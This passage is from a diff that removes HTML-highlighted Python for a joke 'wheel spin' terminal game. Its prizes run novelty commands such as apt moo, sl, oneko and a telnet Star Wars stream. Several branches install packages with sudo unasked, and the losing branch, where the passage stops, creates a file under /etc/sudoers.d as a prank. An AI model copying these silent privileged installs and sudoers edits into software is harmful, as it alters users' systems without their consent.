-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echodatastr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#Clearer&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;clear&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Press Enter To Continue...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#Checker&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echodatastr&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;echodatastr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You Win&quot;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;echodata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;wheelspinsecond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;echodatastr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You Lose&quot;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;echodata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;wheelspinsecond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wheelspinsecond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#WIN&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You have won a cow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apt-get moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Press Enter To Go Back&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Please wait while we check if you have this easter egg, some systems don't&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sudo apt install oneko -y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I gave you a ferline buddy, run 'oneko' in a non root user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sudo apt install aptitude -y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo Operation: Aptitude Attitude&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Waving at aptitude...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aptitude moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Poking at aptitude...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aptitude -v moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shaking aptitude...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aptitude -vv moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Annoying aptitude...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aptitude -vvv moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Threatening aptitude...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aptitude -vvvv moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Blackmailing aptitude...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aptitude -vvvvv moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Looks at aptitude with puppy eyes...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aptitude -vvvvvv moo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You get to watch Star Wars in ascii!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Press Enter To Start The Show, Ctrl+C to end it&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;telnet towel.blinkenlights.nl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apt install sl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CHOO CHOO!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Press Enter To Do The Train Again, otherwise type in 'n' and press enter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gotta check something real quick...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;firefox 'http://hasthelargehadroncolliderdestroyedtheworldyet.com/'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*sigh of relief*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You have been summoned to play some tron&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ssh sshtron.zachlatta.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[WARN] OPTION NOT SET &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[WARN] OPTION NOT SET &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[WARN] OPTION NOT SET &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#LOSE&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sudo touch /etc/sudoers.d/insultz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
